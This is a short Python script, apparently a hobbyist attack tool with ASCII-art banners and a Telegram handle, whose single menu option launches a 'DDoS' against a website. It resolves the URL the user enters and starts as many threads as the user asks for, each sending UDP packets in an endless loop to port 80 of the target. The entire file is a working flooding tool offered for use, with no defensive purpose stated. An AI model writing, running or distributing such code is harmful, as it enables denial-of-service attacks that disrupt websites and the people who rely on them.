import colorama
from colorama import Fore, Back, Style
import time
import socket
import sys
import _thread
version="1.0"
telegram="t.me/MRROBOTH"
colorama.init()
print(Fore.BLUE+"      ___________                                       ")
print(Fore.BLUE+"     x...........x                                   ")
print(Fore.BLUE+"     |...........|                         ")
print(Fore.BLUE+"     |...........|========| @                                  ")
print(Fore.BLUE+"     |...........|                                    ")
print(Fore.BLUE+"     |...........|                                   ")
print(Fore.BLUE+"     x-----------x                       ")
print(Fore.GREEN+"===============================")
print(Fore.RED+"  ver:1.0  telegram:t.me/MRROBOTH")
print(Fore.GREEN+"===============================")
print("")
print(Fore.BLUE+"[1]"+Fore.GREEN+"Ddos to website")
print("")
print(Fore.BLUE+" __")
print("|")
a=int(input("|Enter your number >"))
if a == 1:
    print(Fore.BLUE+"   ____ ____________             ")
    print(Fore.BLUE+"   |    (___________| @     ")
    print(Fore.BLUE+"   |----|\ )         ")
    print(Fore.BLUE+"   |  |----)          ")
    print(Fore.BLUE+"   |__|         ")
    print(Fore.GREEN+"===================================")
    print(Fore.GREEN+"ver:1.0      telegram: t.me/MRROBOTH")
    print(Fore.GREEN+"===================================")
    print(Fore.BLUE+"")
    site=input("Enter url website: ")
    thread_count=input("Enter Speed attack: ")
    ip=socket.gethostbyname(site)
    UDP_PORT=80
    MESSAGE=input("enter your message: ")
    print(Fore.GREEN+"[*] Target:"+" "+site)
    print(Fore.GREEN+"[*] Port attack:"+" "+"80")
    print("")
    time.sleep(2)
    print(Fore.GREEN+"[*] Please wait...")
    time.sleep(3)
    print(Fore.GREEN+"[*] connect to server...")
    time.sleep(3)
    print(Fore.GREEN+"[*] Starting attack =>...")
    time.sleep(3)
    def ddos(i):
        while 1:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
            print(Fore.BLUE+"[=>] send to server website ->")
    for i in range(int(thread_count)):
        try:
            _thread.start_new_thread(ddos, ("Thread-" + str(i),))
        except KeyboardInterrupt:
            sys.exit(0)
    while 1:
        pass
